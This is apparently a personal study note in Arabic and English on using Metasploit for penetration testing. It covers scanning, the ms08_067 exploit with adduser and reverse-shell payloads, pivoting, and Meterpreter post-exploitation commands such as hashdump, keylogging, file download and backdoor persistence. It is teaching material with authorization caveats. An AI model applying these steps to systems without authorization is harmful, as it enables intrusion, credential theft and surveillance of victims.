- هي عباره عن frame work بيكون جواها عدد كبير جدا من ال exploits وغيرها 
- هي مش بتكشتف طريقه جديده كل الطلاق دي قديمه ومجربه يعني كل الاستغلالات ال فيها دي ثغرات مسجله غالبا بتكون out of scope في برامج bug bounty 
## download 
1. sudo apt update 
2. apt install metasploit-framework-y 
## How to start it  

sudo su      

service postgresql status

service postgresql start

systemctl enable postgresql

msfdb init

msfconsole

## how to use 
 - first run it with                                  ```msfconsole```
 - for search                                                 ```search```
 - use + num of exploit or path of it            
 - show options                                
 - show missing 
 - set                                                       ex: ```set LHOST```
 - exploit      
 - u can use check before exploit to check if target is vuln or not 
 ----
 - لازم تكون عارف IP بتاعك عشان تقدر تعمل reverse shell عن طريق    `ifconfig` 
 - msf6> ?                          --> for help 
 - msf6> jobs -k                 --> to kill any operations run in background  
 - msf6> show advanced   --> to show advanced mode after show options 
 - msf6> workspace           --> عشان تعمل workspace خاصه لكل واحد او لكل مشروع 
 - Usage:
    workspace          List workspaces
    workspace [name]   Switch workspace

OPTIONS:

    -a, --add <name>          Add a workspace.
    -d, --delete <name>       Delete a workspace.
    -D, --delete-all          Delete all workspaces.
    -h, --help                Help banner.
    -l, --list                List workspaces.
    -r, --rename <old> <new>  Rename a workspace.
    -S, --search <name>       Search for a workspace.
    -v, --list-verbose        List workspaces verbosely.
 ---
 - msf > hosts        
 - دي بتكون عشان لو عاوز تحدد specific host معين 
 ----
 - دي Tool بتعرفك مين ال متصل معاك علي نفس الشبكه 
 - ممكن تعمل active scan or passive scan  (active is more powerful)
 - netdiscover -h
 - netdiscover -i eth0 -r 192.1`68.1.0/24 -p
 - -- 
 - Difference between nmap and db_nmap
use both to make scan and then 
- hosts 
- services
-  nmap  do not record the output in hosts
- db_nmap record the output in hosts 
- ---
- can make nmap scan but save files -oA file
- take the path for file.xml and import it inside Metasploit

-  db_import /path/to/file.xml 
- ----
## for searching using metasploit

-  search portscan 
-  use   id 
- show options
- set RPORTS  1-65535
- set RHOSTS  192.168.1.0/24 => 192.168.1.1 `
- set THREADS 10
- run 
- ----
## steps to exploit
  
1- recon & fingerprint 
2- version of ports and scanner 
3- exploit 
4- presist  => back door 




Payload is what is gonna happen after the exploit 

Suppose that you used exploit windows/smb/ms08_067_netapi   SP3 

you need to set payload to know what is gonna happen after attacking the victim
as 

windows/smb/ms08_067_netapi> show payloads 

for example we can choose
 
windows/smb/ms08_067_netapi> set payload windows/adduser
windows/smb/ms08_067_netapi> show options 

after executing the attack you can go to your windows and see users 

can also use payload windows/exec 

windows/shell/reverse_tcp

-----------
## References for CVEs : 
1- https://www.cvedetails.com 
2- https://cve.mitre.org/cve/search_cve_list.html
3- https://www.exploit-db.com

----
## steps needed use cves 
1- verify operating system
2- verify releases or service information 
3- verify open ports 
4- verify services and version information 

---
## specify the exploit to use 
1- every exploit can work only for one operating system
2- every exploit can work only for one specify service version 
3- every exploit can work only with specific privilege
4- every exploit has its own risk score 

---
## shell types 

- Bind shell : Victim open a port and wait the attacker to connect

- reverse shell : victim connected back to the machine of attacker 

- الافضل بيكون هو reverse عشان bind ممكن يكون firewall مشكله ويمنع attacker من انه يوصل بالضحيه   (reverseshell can bypass firewall )
---
## types of payloads 

- stage : send the payloads in many stage (bypass firewall)
- stageless : send the payloads in one shoot 
- --
## note
### Pivoting

**Pivoting** في مجال السيكيورتي يعني إنك بعد ما توصّل لنقطة دخول (مثلاً جهاز أو سيرفر داخل الشبكة)، تبدأ تستخدمه كـ **جسر** عشان توصل لأنظمة أو موارد تانية ما كنتش تقدر توصل لها مباشرة من برّه.

## الفكرة الأساسية
- الجهاز اللي اخترقته يبقى **Pivot Point**.  
- من خلاله تعمل **تحرك جانبي (Lateral Movement)** أو تستغل الثقة الداخلية بين الأجهزة.

## مثال
- تهاجم ويب سيرفر في DMZ → تاخد شل عليه.  
- من السيرفر ده توصل لقاعدة بيانات داخلية أو Active Directory لأن السيرفر شايف الشبكة الداخلية.
- ## الفرق بين Exploit و Payload

### 1. Exploit
- **التعريف:**  
  كود أو تقنية بتستغل ثغرة (Vulnerability) في برنامج أو نظام.
- **الوظيفة:**  
  يفتحلك الباب/المدخل (Access) عن طريق استغلال الضعف.
- **مثال:**  
  SQL Injection يستغل ثغرة في الكود عشان يوصل لقاعدة البيانات.

---

### 2. Payload
- **التعريف:**  
  الكود أو الأمر اللي بيتنفذ بعد ما الـ Exploit ينجح.
- **الوظيفة:**  
  ينفذ الحاجة اللي إنت عاوزها بعد الاستغلال (مثلاً: فتح شل، تحميل ملف، أو تنفيذ أوامر).
- **مثال:**  
  Reverse Shell بيرجعلك اتصال عكسي بالجهاز بعد استغلال الثغرة.

---

## العلاقة بين الاتنين
- **Exploit = طريقة الدخول**  
- **Payload = إنت هتعمل إيه بعد ما تدخل**



---
## Meterpreter session — ملخّص سريع

**Meterpreter** هو payload تفاعلي جزء من مشروع **Metasploit**، مصمّم كـ "قشرة" (in-memory) تعطيك واجهة مرنة للتفاعل مع الجهاز بعد نجاح الاستغلال.

### طبيعة الـ Session
- الـ *session* عبارة عن اتصال تفاعلي بين جهاز المهاجم (المشغل لـ Metasploit) والجهاز المُستهدف بعد تحميل وتشغيل الـ payload.
- تكون في الغالب **reverse** (الجهاز المستهدف يتصل للـ attacker) أو **bind** (يستمع المستهدف) أو HTTP/S variants.

### أوامر سريعة للتعامل مع الـ sessions (msfconsole)
- `sessions` — قائمة الجلسات المفتوحة.  
- `sessions -i <id>` — تدخل على جلسة معينة (interactive).  
- `background` — تخرج من الجلسة وتخليها في الخلفية.  
- `sessions -k <id>` — تقفل جلسة.  
- `sessions -u <id>` — تحوّل الجلسة إلى مترpreter جديدة (upgrade).

### أوامر شائعة داخل Meterpreter
- `sysinfo` — معلومات عن النظام المستهدف.  
- `getuid` — اسم اليوزر الحالي.  
- `pwd` / `ls` / `cd` — تصفّح الملفات.  
- `download <remote> [local]` — تنزيل ملف من الضحية.  
- `upload <local> <remote>` — رفع ملف للضحية.  
- `shell` — فتح shell تفاعلي (cmd / sh) على الجهاز المستهدف.  
- `ps` — عرض العمليات الجارية.  
- `migrate <pid>` — نقل الـ Meterpreter إلى عملية أخرى (لتجنب أن تموت مع العملية الحالية).  
- `keyscan_start` / `keyscan_stop` / `keyscan_dump` — **حسّاس** (تعامل معاه بحذر ضمن نطاق اختبارات مخوّلة).  
- `screenshare` / `screenshot` — لقطة شاشة أو مشاركة شاشة (قد تتطلّب صلاحيات مرتفعة).  
- `portfwd add` — إنشاء توجيه منافذ محلي عبر الجلسة (Pivoting / port forwarding).
- hashdump دي بتجبلك hashes بتاعك windows

> ملحوظة: بعض الأوامر (مثل keylogging، dumps) حساسة جداً وتعتبر أنشطة اختراق متقدمة — استخدمها فقط على نطاقات **مصرّح بها**.

### نصائح عملية
- استخدم `background` لتحتفظ بالجلسة وتفتح جلسات أخرى أو تعمل pivot.  
- بعد الحصول على جلسة، نفّذ `sysinfo` و`getuid` ومعرفة ما إذا كنت بحاجة لـ `migrate` إلى عملية أكثر استقرارًا.  
- سجّل كل الأدلة (timestamps، أوامر، مخرجات) لتحضير PoC نظيف للتقرير.  
- لا تجرّب أوامر قد تؤثر على عمل النظام أو تُغيّر بيانات حقيقية ما لم يكن ذلك جزءاً من نطاق الاختبار واتفاقك مع المالك.

---
## post exploitataion 

- باختصار بيقدر يخليك  تعلي من خطوه الهجوم تطفي firewall او تفتح backdoor او reverse shell 
- هي بتكون بعد ما تقدر تخترق وتعمل meterpreter 
- بعدها اعمل load + Tab Tab  عشان يظهرلك كلال الاوامر ال تقدر تساعدك ممكن من load kiwi
- 